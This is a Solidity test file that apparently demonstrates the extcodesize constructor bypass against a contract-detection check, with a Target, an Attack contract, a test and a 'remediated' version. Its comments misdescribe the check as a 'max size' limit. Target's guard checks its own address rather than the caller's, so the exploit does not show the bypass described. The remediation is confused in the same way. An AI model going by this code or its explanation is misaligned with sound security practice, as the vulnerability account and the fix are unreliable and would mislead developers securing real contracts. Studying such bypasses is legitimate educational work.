// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
//In ethereum network ther is a check of in each contract that he is standing in the limit of the max size. 
// this attack bypass the check
//if we check it during the creation- in the constructor, the code size:=extcodesize(account) will return true alothough it is false.abi
contract Target {
    function isContract(address account) public view returns(bool){
        uint size=0;
        assembly{
            size:=extcodesize(account)
        }
        return size>0;
    }

    bool public pwned;
    function protected()external {
        require(isContract(address(this)),"contract is not allowed");
        pwned=true;

    }
}

contract testTarget is Test{
    function testProtoected() internal{
        vm.expectRevert("contract is not allowed");
        Target(address(this)).protected();

    }
}

contract Attack is Test{
    constructor(address addr){
        Target(addr).isContract(address(this));
        Target(addr).protected();
    }
}

contract RemediatedContract{
    function isContract(address account) public view returns(bool){
        require(tx.origin==msg.sender);
        return account.code.length>0;
    }

    bool public pwd;
    function protected() external{
        require(isContract(address(this)),"contract is not allowd");
        pwd=true;
    }
}

